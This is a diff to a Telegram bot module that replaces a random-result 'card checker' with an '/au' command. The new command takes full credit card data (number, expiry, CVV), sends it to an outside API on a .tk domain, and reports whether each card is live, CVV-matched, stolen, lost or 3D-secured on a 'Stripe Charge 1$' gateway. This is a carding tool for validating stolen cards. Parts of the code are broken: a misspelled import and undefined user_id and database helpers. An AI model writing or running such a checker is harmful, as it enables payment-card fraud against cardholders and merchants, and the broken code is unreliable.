@@ -1,149 +1,153 @@
-import re
-import random
-import asyncio
 from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
+import requests
+import re
+import timE
 from DAXXMUSIC import app
 
-approved_cards = []
-declined_cards = []
-invalid_format_cards = []
 
-# Credit card validation function
-def daxx(card_number):
-    card_number = re.sub(r'\D', '', card_number)
-    if not card_number.isdigit():
-        return "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+session = requests.session()
 
-    digits = list(map(int, card_number))
-    odd_digits = digits[-1::-2]
-    even_digits = digits[-2::-2]
+def auth_func(r, cc, cvv, mes, ano):
+    try:
+        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
+        authurl = f"https://www.mainulhasanbd.tk/prvbotauth/api.php?lista={cc}|{mes}|{ano}|{cvv}"
+        reqone = session.get(authurl)
+        result = reqone.text
+        
+        if "succeeded" in result:
+            response = "CVV Matched ✅"
+        elif "insufficient_funds" in result:
+            response = "Insufficient Funds ❎"
+        elif "incorrect_cvc" in result:
+            response = "CCN Live ❎"
+        elif "transaction_not_allowed" in result:
+            response = "Card Doesn't Support Purchase ❎"
+        elif "do_not_honor" in result:
+            response = "Do Not Honor 🚫"
+        elif "stolen_card" in result:
+            response = "Stolen Card 🚫"
+        elif "lost_card" in result:
+            response = "Lost Card 🚫"
+        elif "pickup_card" in result:
+            response = "Pickup Card 🚫"
+        elif "incorrect_number" in result:
+            response = "Incorrect Card Number 🚫"
+        elif "expired_card" in result:
+            response = "Expired Card 🚫"
+        elif "generic_decline" in result:
+            response = "Generic Decline 🚫"
+        elif "fraudulent" in result:
+            response = "Fraudulent 🚫"
+        elif "lock_timeout" in result:
+            response = "Api Error 🚫"
+        elif "Your card was declined." in result:
+            response = "Generic Decline 🚫"
+        elif "intent_confirmation_challenge" in result:
+            response = "Captcha 😥"
+        elif "stripe_3ds2_fingerprint" in result:
+            response = "3D Secured ❎"
+        elif "Your card does not support this type of purchase." in result:
+            response = "Locked Card 🚫"
+        elif "parameter_invalid_empty" in result:
+            response = "404 error 🚫"
+        elif "invalid_request_error" in result:
+            response = "404 error 🚫"
+        else:
+            response = "Generic Decline 🚫"
+        
+        return f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Result - {response}</b>\n"
+    
+    except Exception as e:
+        print(e)
 
-    total = sum(odd_digits)
-    for digit in even_digits:
-        total += sum(divmod(digit * 2, 10))
-
-    return "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if total % 10 == 0 else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-
-def get_credit_card_info(card_number):
-    card_number = card_number.replace(' ', '')
-    result = daxx(card_number)
-    gateway = "Braintree Auth"
-
-    return f"""
-𝗖𝗮𝗿𝗱: {card_number}
-𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway}
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result}
-"""
-
-@app.on_message(filters.command("chk"))
-async def check_credit_cards(client: Client, message: Message):
-    card_numbers = message.text.split()[1:]  # Extract card numbers from the message
-    if len(card_numbers) > 10:
-        await message.reply("You can only check up to 10 card numbers at a time.")
-        return
-
-    results = []
-    for card_number in card_numbers:
-        info = get_credit_card_info(card_number)
-        results.append(info)
-
-    results_text = "\n".join(results)
-    await message.reply(results_text)
-
-@app.on_message(filters.document)
-async def handle_document(client, message):
-    global approved_cards, declined_cards, invalid_format_cards
-    approved_cards = []
-    declined_cards = []
-    invalid_format_cards = []
-
-    document = message.document
-    if document.mime_type == 'text/plain':
-        await message.download(f"/tmp/{document.file_name}")
-
-        with open(f"/tmp/{document.file_name}", 'r') as file:
-            card_details = file.readlines()
-
-        for line in card_details:
-            parts = line.strip().split('|')
-            if len(parts) == 4:
-                card_number, exp_month, exp_year, cvc = parts
-                is_approved = random.random() > 0.99  # 1% chance of approval
-                result = f"𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {'Approved' if is_approved else 'Card Issuer Declined CVV'}"
-                if is_approved:
-                    approved_cards.append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n{result}")
-                else:
-                    declined_cards.append(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n{result}")
+# Define your command handler
+@app.on_message(filters.command("au"))
+async def authorize(client, message):
+    try:
+        # Check if a message is replied to or if there's a command argument
+        if message.reply_to_message:
+            cc = message.reply_to_message.text
+        else:
+            cc = message.text[len('/au '):]
+        
+        # Validate credit card information
+        if len(cc) == 0:
+            nocc = """
+𝗚𝗜𝗩𝗘 𝗠𝗘 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗖𝗖 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
+            """
+            return await message.reply_text(nocc, message.id) 
+            
+        cards = []
+        x = cc
+        input = re.findall(r"[0-9]+", x)
+        
+        # Check if input is valid
+        if not input or len(input) < 3:
+            nocc = """
+𝗚𝗜𝗩𝗘 𝗠𝗘 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗖𝗖 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
+            """
+            return await message.reply_text(nocc, message.id) 
+        
+        if len(input) == 3:
+            cc = input[0]
+            if len(input[1]) == 3:
+                mes = input[2][:2]
+                ano = input[2][2:]
+                cvv = input[1]
             else:
-                invalid_format_cards.append(line.strip())
+                mes = input[1][:2]
+                ano = input[1][2:]
+                cvv = input[2]
+        else:
+            cc = input[0]
+            if len(input[1]) == 3:
+                mes = input[2]
+                ano = input[3]
+                cvv = input[1]
+            else:
+                mes = input[1]
+                ano = input[2]
+                cvv = input[3]
+            if len(mes) == 2 and (mes > '12' or mes < '01'):
+                ano1 = mes
+                mes = ano
+                ano = ano1
+            
+        if (cc, mes, ano, cvv):
+            cards.append([cc, mes, ano, cvv])
+        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
+        
+        # Send initial response
+        firstresp = f"""
+<b>↯ CHARGE 
 
-        total_cards = len(card_details)
-        approved_count = len(approved_cards)
-        declined_count = len(declined_cards)
-        invalid_count = len(invalid_format_cards)
-
-        keyboard = InlineKeyboardMarkup(
-            [
-                [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({approved_count})", callback_data="view_approved")],
-                [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({declined_count})", callback_data="view_declined")],
-                [InlineKeyboardButton(f"𝐈𝐧𝐯𝐚𝐥𝐢𝐝👽 ({invalid_count})", callback_data="view_invalid")],
-            ]
-        )
-
-        await message.reply(
-            f"𝘚𝘏𝘖𝘗𝘐𝘍𝘠 + 𝘈𝘜𝘛𝘏𝘖𝘙𝘐𝘡𝘌 $5!\n\n 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 💳: {total_cards}\n 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {approved_count}\n𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {declined_count}\n 𝐈𝐧𝐯𝐚𝐥𝐢𝐝👽 : {invalid_count}",
-            reply_markup=keyboard
-        )
-    else:
-        await message.reply("Please upload a valid .txt file.")
-
-@app.on_callback_query(filters.regex("view_approved"))
-async def view_approved(client, callback_query):
-    global approved_cards
-    if approved_cards:
-        approved_text = "\n\n".join(approved_cards)
-        approved_cards = []  # Clear approved cards after displaying
-        await callback_query.message.reply(f"𝖦𝖠𝖳𝖤𝖶𝖠𝖸: 𝖲𝖧𝖮𝖯𝖨𝖥𝖸 + 𝖠𝖴𝖳𝖧𝖮𝖱𝖨𝖹𝖤 $5:\n\n{approved_text}")
-    else:
-        await callback_query.message.reply("No approved cards.")
-    await update_buttons(callback_query)
-
-@app.on_callback_query(filters.regex("view_declined"))
-async def view_declined(client, callback_query):
-    global declined_cards
-    if declined_cards:
-        declined_text = "\n\n".join(declined_cards)
-        declined_cards = []  # Clear declined cards after displaying
-        await callback_query.message.reply(f"Declined Cards:\n{declined_text}")
-    else:
-        await callback_query.message.reply("No declined cards.")
-    await update_buttons(callback_query)
-
-@app.on_callback_query(filters.regex("view_invalid"))
-async def view_invalid(client, callback_query):
-    global invalid_format_cards
-    if invalid_format_cards:
-        invalid_text = "\n".join(invalid_format_cards)
-        invalid_format_cards = []  # Clear invalid format cards after displaying
-        await callback_query.message.reply(f"Invalid Format Cards:\n{invalid_text}")
-    else:
-        await callback_query.message.reply("No invalid format cards.")
-    await update_buttons(callback_query)
-
-async def update_buttons(callback_query):
-    global approved_cards, declined_cards, invalid_format_cards
-    approved_count = len(approved_cards)
-    declined_count = len(declined_cards)
-    invalid_count = len(invalid_format_cards)
-
-    keyboard = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({approved_count})", callback_data="view_approved")],
-            [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({declined_count})", callback_data="view_declined")],
-            [InlineKeyboardButton(f"𝐈𝐧𝐯𝐚𝐥𝐢𝐝👽 ({invalid_count})", callback_data="view_invalid")],
-        ]
-    )
-
-    await callback_query.message.edit_reply_markup(reply_markup=keyboard)
-    await callback_query.answer()
+⊗ Card - <code>{fullcc}</code> 
+⊗ Status - Checking...
+⊗ Response - □□□□□
+⊗ GATEWAY- Stripe Charge 1$
+</b>
+        """
+        firstchk = await message.reply_text(firstresp, message.id)
+        
+        # Simulate checking process
+        # Add your checking logic here
+        
+        # Send final response
+        finalresp = auth_func("", cc, cvv, mes, ano)
+        
+        finalchk = await Client.edit_message_text(message.chat.id, firstchk.id, finalresp)
+        
+        # ANTISPAM TIME SET
+        module_name = "antispam_time"
+        value = int(time.time())
+        updatedata(user_id, module_name, value)
+        
+        fetch = fetchinfo(user_id)
+        credit = int(fetch[5])
+        module_name = "credit"
+        deduct = credit - 1
+        value = deduct
+        updatedata(user_id, module_name, value)
+        
+    except Exception as e:
+        print(e)
